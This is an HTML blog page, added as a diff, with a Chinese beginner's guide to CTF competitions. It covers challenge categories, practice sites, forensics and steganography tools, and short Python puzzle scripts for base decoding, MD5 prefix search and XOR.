@@ -1,0 +1,2575 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CTF入坑, Danie1&#39;s Blog">
+    <meta name="description" content="
+
+
+CTF学习前言本内容主要以解题模式为学习重点，由Stalker-16成员(Danie1,7iny)整理。
+day01–7iny解题模式CTF赛题目类别与能力对应· Web-Web应用的漏洞挖掘和利用· PWN-逆向分析、漏洞挖掘、漏洞">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>CTF入坑 | Danie1&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/medias/logo.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    
+    <script src="/libs/jquery/jquery.min.js"></script>
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper head-container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Danie1's Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Danie1's Blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/Danie1233" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/Danie1233" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/26.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CTF入坑</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-08-05
+                </div>
+                
+
+                
+
+                
+
+                
+				
+                
+            </div>
+            
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190805.jpg"></p>
+<a id="more"></a>
+
+<h1 id="CTF学习"><a href="#CTF学习" class="headerlink" title="CTF学习"></a>CTF学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本内容主要以解题模式为学习重点，由Stalker-16成员(Danie1,7iny)整理。</p>
+<h2 id="day01–7iny"><a href="#day01–7iny" class="headerlink" title="day01–7iny"></a>day01–7iny</h2><h3 id="解题模式CTF赛题目类别与能力对应"><a href="#解题模式CTF赛题目类别与能力对应" class="headerlink" title="解题模式CTF赛题目类别与能力对应"></a>解题模式CTF赛题目类别与能力对应</h3><p>· Web-Web应用的漏洞挖掘和利用<br>· PWN-逆向分析、漏洞挖掘、漏洞利用、安全编程<br>· Reverse Engineering-逆向分析、安全编程<br>· Crypto-密码、逆向分析、安全编程<br>· PPC（Professional Programming and Coding）-安全编程<br>· Forensic-网络流量分析、隐写分析、系统取证等<br>· Recon-社工、情报搜集分析</p>
+<h3 id="相应的赛题要求"><a href="#相应的赛题要求" class="headerlink" title="相应的赛题要求"></a>相应的赛题要求</h3><p>PWN、Reverse偏重对汇编、逆向的理解<br>Crypto偏重对数学、算法的深入学习<br>Web偏重对技巧沉淀、快速搜索能力的挑战<br>Misc则更为复杂，所有与计算机安全挑战有关的都算在其中</p>
+<h3 id="如何入门–如何学？"><a href="#如何入门–如何学？" class="headerlink" title="如何入门–如何学？"></a>如何入门–如何学？</h3><p>1、恶补基础知识（有基础的跳过此步）</p>
+<blockquote>
+<p>都需要学的内容：<br>Linux基础、计算机组成原理、操作系统原理、网络协议分析<br>PWN+Reverse+Crypto随机搭配：<br>IDA工具使用（f5插件）、逆向工程、密码学、缓冲区溢出等<br>Web+Misc组合：<br>网络安全、内网渗透、数据库安全等</p>
+</blockquote>
+<p>2、尝试从脑洞开始（hackgame）</p>
+<blockquote>
+<p>1.<a target="_blank" rel="noopener" href="https://prompt.ml/0">xss练习平台</a></p>
+<p>2.<a target="_blank" rel="noopener" href="https://redtiger.labs.overthewire.org/">sql注入挑战</a></p>
+</blockquote>
+<p>3、从基础题目出发</p>
+<blockquote>
+<p>刷题站点：</p>
+<p>1.<a target="_blank" rel="noopener" href="https://www.ichunqiu.com/">i春秋</a> </p>
+<p>2.<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">xctf攻防世界</a></p>
+<p>3.<a target="_blank" rel="noopener" href="http://www.wechall.net/challs">国外CTF题库</a></p>
+<p>4.<a target="_blank" rel="noopener" href="https://microcorruption.com/login">国外PWN+Reverse方向</a></p>
+<p>5.<a target="_blank" rel="noopener" href="https://smashthestack.org/">ssh连接玩wargame</a></p>
+<p>6.<a target="_blank" rel="noopener" href="https://overthewire.org/wargames/">老牌wargame</a></p>
+<p>7.<a target="_blank" rel="noopener" href="https://pwnable.kr/play.php">pwn题库</a></p>
+</blockquote>
+<p>4、学习信息安全专业知识</p>
+<blockquote>
+<p>书籍</p>
+<p>PWN+Reverse+Crypto随机搭配：<br>RE for Beginners（逆向工程入门）<br>IDA Pro权威指南<br>揭秘家庭路由器0day漏洞挖掘技术<br>自己动手写操作系统<br>黑客攻防技术宝典：系统实战篇</p>
+<p>Web+Misc组合：<br>Web应用安全权威指南<br>Web前端黑客技术揭秘<br>黑客秘籍-渗透测试实用指南<br>黑客攻防技术宝典Web实战篇<br>代码审计：企业级Web代码安全架构</p>
+</blockquote>
+<p>5、锻炼体力而耐力</p>
+<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><blockquote>
+<p>以下是由各大大佬整理的工具库，全部放在了github上</p>
+<p>1.<a target="_blank" rel="noopener" href="https://github.com/truongkma/ctf-tools">工具库1</a> </p>
+<p>2.<a target="_blank" rel="noopener" href="https://github.com/zardus/ctf-tools">工具库2</a></p>
+<p>3.<a target="_blank" rel="noopener" href="https://github.com/TUCTF/Tools">工具库3</a></p>
+</blockquote>
+<h3 id="MISC学习"><a href="#MISC学习" class="headerlink" title="MISC学习"></a>MISC学习</h3><p>学习MISC的好处：MISC可能是切入CTF竞赛领域、培养兴趣的最佳入口<br>1.基础知识/技能面、逆向思维<br>2.“解谜”能力、“脑洞”大开</p>
+<p>1.国外：Google Map、Earth、Street View<br>2.国内：Baidu地图、卫星视图、全景视图：map.baidu.com腾讯地图、卫星、街景：map.qq.com<br>· 从网络世界到物理世界<br>1.IP2Location IP地址（因特网上的虚拟地址）&gt;现实世界中的具体地理位置<br>2.IP2Location数据库：WHOIS数据库，GeolP，IP2Location，纯真数据库（QQIP查询使用）<br>· Google image search<br>1.搜索图片含义和外观类似图片</p>
+<p>2.Encoding Analysis 编码分析<br>· 二进制编码<br>· 十六进制编码<br>1.单字节：00-FF·ASClI字符编码<br>2.字母：A-Z：41-5A；a-Z：61-7A<br>· Base64编码<br>1.基于64个可打印字符来表示二进制数据的表示方法<br>2.字符集：大小写字母各26个，10个数字，加号“+”，斜杠“/”，一共64个字符，等号“=”用来作为后缀用途<br>· Huffman Code-无损压缩编码，01串显示<br>· 条形码：宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符<br>·国际标准</p>
+<ul>
+<li>EAN-13：商品条码标准，13位数字</li>
+<li>Code-39：39字符</li>
+<li>Code-128：128字符<br>·条形码</li>
+<li>在线条码生成器/识别器</li>
+<li>ZXing-多平台条形码生成、扫码库<br>条形码在线解码：<a target="_blank" rel="noopener" href="https://online-barcode-reader.inliteresearch.com/">网站</a><br>题目1：Barcode.jpeg<br>· 二维码：用某种特定几何图形按一定规律在平面（二维方向上）分布的黑白相间的图形记录数据符号信息</li>
+</ul>
+<p>1.堆叠式/行排式二维条码：Code 16K、Code49、PDF417<br>2.矩阵式二维码：QR CODE</p>
+<blockquote>
+<p>常见题目二维码、条形码的恢复<br>参考文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/geek/204516.html">freebuf</a><br>练习平台：<a target="_blank" rel="noopener" href="http://daka.whaledu.com:9999/">蓝鲸安全打卡练习场</a><br>参考writeup:<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/27b8be64811e">简书</a></p>
+</blockquote>
+<p>练习蓝鲸安全打卡练习场题目：<br>1.破碎的心–画图按住ctrl，按上下键不断还原<br>2.黑白打字机–画图ctrl+shift+i反色，图片隐写解密，86版五笔对照表</p>
+<blockquote>
+<p>图片隐写解密软件<a target="_blank" rel="noopener" href="http://www.oyksoft.com/soft/19151.html">下载地址</a></p>
+</blockquote>
+<p>3.Forensic Analysis 取证分析</p>
+<p>· 取证分析-取证对象<br>1.文件file<br>2.磁盘disk<br>3.网络数据包pcap<br>4.内存dump<br>5.系统镜像image<br>· 取证分析挑战目标<br>1.一般为发现在取证对象中隐藏的Flag（代表要取证的敏感信息）<br>2.取证分析通常和隐写分析联系在一起<br>· 文件格式分析常用命令和工具<br>1.基本命令file、identify、strings：用于文件类型探测<br>2.winhex、UE：用于直接察看文件16进制数据<br>3.binwalk：分析二进制文件，提取其中隐藏文件等<br>· 需要了解常见文件特征串<br>1.<a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/List">http://en.wikipedia.org/wiki/List</a> of file signatures<br>2.特别是JPEG、PNG、GIF、BMP等图片文件，ZIP、RAR、TAR、7z等压缩文件，mp3、wma、avi等音视频文件</p>
+<p>音频取证<br>· <a target="_blank" rel="noopener" href="https://iboxgalileogiftedschoolor-my.sharepoint.com/personal/wangshusong_auooo_com/_layouts/15/guestaccess.aspx?docid=0f7d6900c9d0e49f6847482800cec4f0c&authkey=AZdJzcQaggeMsOlvhXc-cZs&e=zV8BNd">Audacity</a>音频处理软件，查看声音波形</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2018/01/ctfwav.html">国光音频取证总结</a></p>
+<p>磁盘取证<br>· 磁盘分区格式<br>1.Windows:FAT12-&gt;FAT16-&gt;FAT32-&gt;NTFS<br>2.Linux:EXT2-&gt;EXT3-&gt;EXT4<br>3.FAT主磁盘结构</p>
+<p>| 主引导区 | 文件分配表#1 | 文件分配表#2 | 根目录 | 其他所有数据剩下磁盘空间 |</p>
+<p>删除文件<br>·目录表中文件名第一字节E5<br>·文件恢复和取证工具<br>EasyRecovery、MedAnalyze、FTK<br>网络数据包Pcap取证分析<br>· Wireshark工具<br>书籍《Wireshark抓包分析实战》<br>· 流量统计和会话列表<br>· 善用过滤规则，找出关注的网络流纪录<br>· 流重组：Follow TCP Stream<br>· 常见网络通信协议的理解<br>IP/TCP、UDP/HTTP、DNS、.….<br>·提取流中的文件数据</p>
+<p>内存与image镜像取证分析<br>· 内存取证<br>1.Volatility内存镜像分析工具<br>2.解析Windows/Linux/MacOSX内存结构<br>3.分析当前运行进程列表、进程内存数据等<br>4.根据题目提示寻找线索和思路，提取分析指定进程的特定内存数据<br>· Image镜像取证<br>1.Binwalk<br>2.根据题目提示提取镜像中需关注的文件<br>3.分析提取文件中的应用层数据</p>
+<p>4.Steganalysis 隐写分析</p>
+<p>隐写术<br>· 隐写载体<br>1.文本<br>2.图片<br>3.音频<br>4.视频<br>· 隐写方法和工具<br>1.RSD、LSB、DCT<br>2.<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Steganography_tools">https://en.wikipedia.org/wiki/Steganography_tools</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2018/01/ctfimg.html">国光图片隐写总结</a></p>
+<p>· 识别隐写<br>1.统计分析<br>2.Noise floor consistency analysis 噪声一致性分析<br>· 隐写识别工具<br>1.Stegdetect<br>2.StegSecret<br>3.GFE Stealth<br>· 隐写分析<br>1.<a target="_blank" rel="noopener" href="http://www.garykessler.net/library/fsc_stego.html">http://www.garykessler.net/library/fsc_stego.html</a></p>
+<h2 id="day01–Danie1"><a href="#day01–Danie1" class="headerlink" title="day01–Danie1"></a>day01–Danie1</h2><hr>
+<p>MISC(Miscellaneous)类型，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。</p>
+<p>例题<code>day01.zip</code>下载网盘<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1P_dQTLxLwdA1anIGdgWqZw">链接</a> 提取码: fjru</p>
+<h3 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h3><hr>
+<h4 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h4><ul>
+<li>例：  ..-. .-.. .- –. .—- ..— …– ….- ….. -…. </li>
+<li><a target="_blank" rel="noopener" href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></li>
+</ul>
+<h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><ul>
+<li><p>它是一种替换加密的技术，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%98%8E%E6%96%87">明文</a>中的所有字母都在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E6%AF%8D%E8%A1%A8">字母表</a>上向后（或向前）按照一个固定数目进行偏移后被替换成<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AF%86%E6%96%87">密文</a>。</p>
+</li>
+<li><p>例： iodj{dvgi}</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p>
+</li>
+</ul>
+<h4 id="base编码"><a href="#base编码" class="headerlink" title="base编码"></a>base编码</h4><ul>
+<li><p>base16:</p>
+<p>Base16编码就是将ASCII字符集中可打印的字符(数字0<del>9和字母A</del>F)对应的二进制字节数据进行编码</p>
+</li>
+<li><p>编码的方式: 根据ASCII编码得到对应的二进制,将所有二进制串起来,然后按4个二进制位分割,转化成十进制数值,根据Base16编码表得到编码</p>
+</li>
+<li><p>例将”ILU”字符串加密</p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080501.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080502.png"></p>
+</li>
+</ul>
+<ul>
+<li><p>base32:</p>
+<p>与Base16编码区别的是,Base32使用了ASCII编码中可打印的32个字符(大写字母A<del>Z和数字2</del>7)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组,由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位,则在编码后数据补充”=”</p>
+</li>
+<li><p>编码方式：先根据ASCII编码得到对应字符编码值以及对应二进制,将所有二进制串起来,然后按照5个二进制位为一组分割 ,得到十进制值=&gt;找到Base32编码表找到对应的字符.案例总共分割成了5组(25位),还差三组(15位).在末尾补充3个”=”.</p>
+</li>
+<li><p>例将”ILU”字符串加密</p>
+</li>
+<li><p>   <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190080503.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080504.png"></p>
+</li>
+</ul>
+<ul>
+<li><p>base64:</p>
+<p>Base64编码使用了ASCII编码中64个可打印的字符(大写字母A<del>Z,小写字母a</del>z,数字0~9以及”+”,”/“)将任意字节数据进行编码.Base64编码将串起来的二进制以6位进行分割.所以分切之前的二进制位数应该是24的倍数(即6,8的最小公倍数).如果不足24位,则在编码后数据后面添加”=”</p>
+</li>
+<li><p>编码方式：先根据ASCII编码得到对应字符编码值以及对应二进制，将串起来的二进制按6位分为一组.得到4组(24位).所以末尾不用补充”=”</p>
+</li>
+<li><p>例将”ILU”字符串加密</p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080505.png"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080506.png"></p>
+</li>
+</ul>
+<ul>
+<li><p>题目</p>
+<pre><code class="txt">MzQ0MTM1MzYzNDQ1MzQzNjM0NDYzNTMyMzMzMjM0MzQzNDQzMzQzOTM1NDEzNTM0MzQzNzM1MzQzNDQyMzQzNzM0NDMzNDQxMzQ0MzM1MzUzNTMzMzUzNzM1MzMzNTM1MzQ0MTM0MzIzNDM4MzQzNTM0MzUzNDQ1MzUzMzM1MzIzNDM4MzUzNTMzMzYzNTM0MzMzMjM1MzAzNDM5MzM0NA==
+
+flag格式：flag&#123;xxxx&#125;</code></pre>
+</li>
+<li><p>代码</p>
+<pre><code class="python">#!/usr/bin/python
+# -*-coding:utf-8-*-
+
+import base64
+
+</code></pre>
+</li>
+</ul>
+<p>  def bs(s):<br>      while(1):<br>          ok = 0<br>          try:<br>              s1 = base64.b64decode(s).decode(‘ascii’)<br>              ok = 1<br>              s=s1<br>          except:<br>              pass</p>
+<pre><code>      try:
+          s2 = base64.b32decode(s).decode(&#39;ascii&#39;)
+          ok = 1
+          s=s2
+      except:
+          pass
+
+      try:
+          s3 = base64.b16decode(s).decode(&#39;ascii&#39;)
+          ok = 1
+          s=s3
+      except:
+          pass
+
+      if ok == 0:
+          break
+  return  s</code></pre>
+<p>  if <strong>name</strong> == “<strong>main</strong>“:<br>      s = raw_input(“请输入字符串:”)<br>      res = bs(s)<br>      print ‘—————————‘<br>      print ‘result:’+ res</p>
+<pre><code>
+
+
+
+
+
+### ascii编码
+
+* ![](https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080508.png)
+
+
+
+### unicode编码
+
+例：`&amp;#102;&amp;#108;&amp;#97;&amp;#103;`
+
+* http://tool.chinaz.com/tools/unicode.aspx
+
+
+
+#### MD5
+
+* MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一
+
+* 加密
+
+![](https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080509.png)
+
+* 解密：https://www.cmd5.com/
+
+![](https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080510.png)
+
+
+
+* 题目1
+
+```txt
+md5(?)[:6] == &#39;233333&#39;</code></pre>
+<ul>
+<li><p>代码</p>
+<pre><code class="python">#-*-coding:utf-8-*-
+
+import hashlib
+
+for i in range(100000000):
+    m = hashlib.md5()
+    m.update(str(i).encode(&#39;utf-8&#39;))
+    res = m.hexdigest()
+    if res[:6] == &#39;233333&#39;:
+        print i
+        break</code></pre>
+</li>
+</ul>
+<ul>
+<li><p>题目2</p>
+<pre><code class="txt">已知一段由5个大写字母组成的明文字符串，经过md5加密后的密文前6位为73acd9,求加密前的明文</code></pre>
+</li>
+<li><p>代码</p>
+<pre><code class="python">#!/usr/bin/python
+# -*-coding:utf-8-*-
+
+import hashlib
+
+letter = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
+
+for i in letter:
+    for j in letter:
+        for k in letter:
+            for l in letter:
+                for n in letter:
+                    cipher = i+j+k+l+n
+                    m = hashlib.md5()
+                    m.update(cipher)
+                    res = m.hexdigest()
+                    if res[:6] == &#39;73acd9&#39;:
+                        print res
+                        print cipher
+                        break
+</code></pre>
+</li>
+</ul>
+<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><ul>
+<li><p>相同为0，不同为1</p>
+</li>
+<li><p>题目</p>
+<pre><code class="txt">密文 : FR8SFAgwJzUWASwLHAEsAA4=</code></pre>
+</li>
+<li><p>代码</p>
+<pre><code class="python">#!usr/bin/python  
+#-*- coding:utf-8 -*-  
+import base64
+
+ming = &#39;FR8SFAgwJzUWASwLHAEsAA4=&#39;
+mi=base64.b64decode(ming)
+
+for j in range(0,127):
+
+    flag=&#39;&#39;  
+    for i in range(len(mi)):
+        t=ord(mi[i])^j
+        flag+=chr(t)
+    if &#39;flag&#39; in flag :
+        print flag
+        break
+</code></pre>
+</li>
+</ul>
+<h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><hr>
+<p>图片隐写主要考察信息在图片中隐写的几种方法，文件头信息修改，stegsolve工具使用，LSB算法，binwalk工具使用等知识。</p>
+<h4 id="常用工具介绍（常用工具下载地址：https-www-ctftools-com-down-）"><a href="#常用工具介绍（常用工具下载地址：https-www-ctftools-com-down-）" class="headerlink" title="常用工具介绍（常用工具下载地址：https://www.ctftools.com/down/）"></a>常用工具介绍（常用工具下载地址：<a target="_blank" rel="noopener" href="https://www.ctftools.com/down/%EF%BC%89">https://www.ctftools.com/down/）</a></h4><ul>
+<li><p>binwalk：是一个固件分析工具，多用于逆向工程、取证、隐写分析</p>
+</li>
+<li><p>winhex：是在Windows下执行的十六进制编辑软件，此软件功能强大，有完好的分区管理功能和文件管理功能，在CTF中一般用来查看文件头格式、修改16进制数据等。</p>
+</li>
+<li><p>Stegsolve：是一款图片分析工具，功能十分强大</p>
+</li>
+<li><p>Stegdetect：是一种数字图像隐写分析工具，主要实现JPEG图像的隐秘信息的嵌入的检测</p>
+</li>
+<li><p>foremost：和binwalk结合使用，提取隐藏信息。</p>
+</li>
+<li><p>MP3stego：音频隐写工具 （链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1fSSX-e-Q95GY0bftght3Pg">https://pan.baidu.com/s/1fSSX-e-Q95GY0bftght3Pg</a><br>提取码：0r3r ）<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p>
+<ul>
+<li><p>用法：隐藏信息  encode -E hidden_text.txt -P pass svega.wav stego.mp3</p>
+<p>提取信息 decode -X -P pass svega_stego.mp3</p>
+</li>
+</ul>
+</li>
